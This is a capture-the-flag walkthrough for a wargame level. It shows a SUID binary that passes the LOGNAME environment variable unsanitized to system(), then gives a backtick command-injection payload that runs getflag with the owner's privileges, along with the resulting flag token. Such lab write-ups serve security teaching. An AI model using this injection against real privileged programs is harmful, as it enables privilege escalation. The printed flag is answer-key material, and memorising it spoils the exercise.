### Solution

1. **List files and check permissions**

	```bash
	ls -l
	```

	You will see the following SUID binary:

	```
	-rwsr-sr-x 1 flag07 level07 8805 Mar  5  2016 level07
	```

	The binary `level07` is **owned by `flag07`** and has the **SUID bit** set, meaning it executes with `flag07`'s privileges.

2. **Transfer the executable file to your host machine:**

	From your host, use `scp` to copy the file:

	```bash
	scp -P 4242 level07@<vm-ip>:~/level07 .
	```

3. **Analyze the binary with Ghidra**

	Examining the binary reveals the following, it reads the `LOGNAME` environment variable:

	```c
	char *pcVar1 = getenv("LOGNAME");
	asprintf(&local_1c, "/bin/echo %s ", pcVar1);
	system(local_1c);
	```

	This means: the program **constructs and executes a shell command** using whatever is inside `LOGNAME`, without sanitizing it.

4. **Exploit the insecure environment usage**

	You can inject a command using **backticks or `$()`** into the `LOGNAME` environment variable.

	Run this:

	```bash
	LOGNAME='`getflag`' ./level07
	```

	The program will execute:

	```bash
	/bin/echo `getflag`
	```

	Which gets expanded to:

	```
	/bin/echo Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
	```

	Output:

	```
	Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
	```

	You’ve successfully executed `getflag` with `flag07`’s privileges using environment variable injection.
